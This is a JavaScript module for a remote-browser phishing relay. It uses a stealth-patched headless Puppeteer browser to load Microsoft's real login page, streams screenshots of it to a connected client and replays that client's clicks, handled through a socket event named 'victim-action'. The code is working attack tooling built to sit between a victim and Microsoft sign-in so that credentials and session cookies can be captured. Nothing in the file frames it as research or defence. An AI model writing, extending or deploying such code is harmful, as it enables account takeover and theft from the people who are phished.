const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
const axios = require('axios');

puppeteer.use(StealthPlugin());

async function startSession(io, socket) {
    console.log(`[STAGE 1] Launching Puppeteer for ${socket.id}`);
    let browser;

    try {
        browser = await puppeteer.launch({
            headless: "new",
            args: [
                '--no-sandbox',
                '--disable-setuid-sandbox',
                '--disable-dev-shm-usage',
                '--single-process' // Crucial for low-memory cloud containers
            ]
        });

        console.log(`[STAGE 2] Browser launched. Opening page...`);
        const page = await browser.newPage();
        await page.setViewport({ width: 1280, height: 720 });

        console.log(`[STAGE 3] Navigating to target...`);
        await page.goto('https://login.microsoftonline.com/', { 
            waitUntil: 'domcontentloaded', // Faster initial response
            timeout: 60000 
        });

        // FUNCTION: Send screenshot to UI
        const streamFrame = async () => {
            try {
                const screenshot = await page.screenshot({ encoding: 'base64', type: 'jpeg', quality: 35 });
                socket.emit('browser-render', { screenshot });
            } catch (e) {
                console.error("Stream error:", e.message);
            }
        };

        // Initial frame
        await streamFrame();
        console.log(`[STAGE 4] First frame sent to socket ${socket.id}`);

        socket.on('victim-action', async (data) => {
            if (data.type === 'click') {
                await page.mouse.click(data.x, data.y);
                await streamFrame(); // Update immediately on click
            }
        });

        socket.on('disconnect', async () => {
            console.log(`[CLEANUP] Closing browser for ${socket.id}`);
            if (browser) await browser.close();
        });

    } catch (error) {
        console.error('[CRITICAL ERROR]', error.message);
        socket.emit('error', { msg: "Browser failed to start" });
        if (browser) await browser.close();
    }
}

module.exports = { startSession };
